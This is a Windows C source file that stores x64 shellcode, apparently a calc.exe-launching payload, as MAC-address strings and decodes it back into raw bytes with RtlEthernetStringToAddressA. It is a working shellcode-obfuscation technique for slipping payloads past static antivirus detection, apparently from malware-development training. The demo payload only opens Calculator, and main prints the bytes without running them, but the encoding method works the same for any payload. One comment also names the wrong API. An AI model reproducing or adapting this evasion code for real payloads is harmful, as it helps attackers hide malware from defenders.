#include <Windows.h>
#include <stdio.h>


char* MacArray[46] = {
		"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48", "31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",
		"50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C", "20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",
		"42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01", "D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",
		"8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41", "01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",
		"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0", "41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",
		"41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9", "57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",
		"01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-F0-B5-A2-56-41", "BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",
		"75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C", "63-2E-65-78-65-00"
};

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
	PCSTR		S,
	PCSTR* Terminator,
	PVOID		Addr
	);

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

	PBYTE          pBuffer = NULL,
		TmpBuffer = NULL;

	SIZE_T         sBuffSize = 0;

	PCSTR          Terminator = NULL;

	NTSTATUS       STATUS = 0;

	// Getting RtlIpv6StringToAddressA address from ntdll.dll
	fnRtlEthernetStringToAddressA pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the real size of the shellcode which is the number of MAC addresses * 6
	sBuffSize = NmbrOfElements * 6;


	// Allocating memeory which will hold the deobfuscated shellcode
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	// Loop through all the MAC addresses saved in MacArray
	for (int i = 0; i < NmbrOfElements; i++) {

		// Deobfuscating one MAC address at a time
		// MacArray[i] is a single Mac address from the array MacArray
		if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
			// if it failed
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], STATUS);
			return FALSE;
		}

		// 6 bytes are written to TmpBuffer at a time
		// Therefore Tmpbuffer will be incremented by 6 to store the
		TmpBuffer = (PBYTE)(TmpBuffer + 6);

	}

	// Save the base address & size of the deobfuscated payload
	*ppDAddress = pBuffer;
	*pDSize = sBuffSize;

	return TRUE;

}

int main() {
	PBYTE pDeob = NULL;
	SIZE_T sSize = 0;
	BOOL ok;

	ok = MacDeobfuscation(
		MacArray,                                  
		sizeof(MacArray) / sizeof(MacArray[0]),
		&pDeob,
		&sSize
	);

	if (!ok) {
		fprintf(stderr, "Deobfuscation failed\n");
		return 1;
	}

	printf("Deobfuscated size: %zu bytes\n", sSize);

	printf("Raw bytes (hex):\n");
	for (SIZE_T i = 0; i < sSize; i++) {
		printf("%02X ", pDeob[i]);
		if ((i + 1) % 16 == 0) printf("\n");
	}

	return 0;
}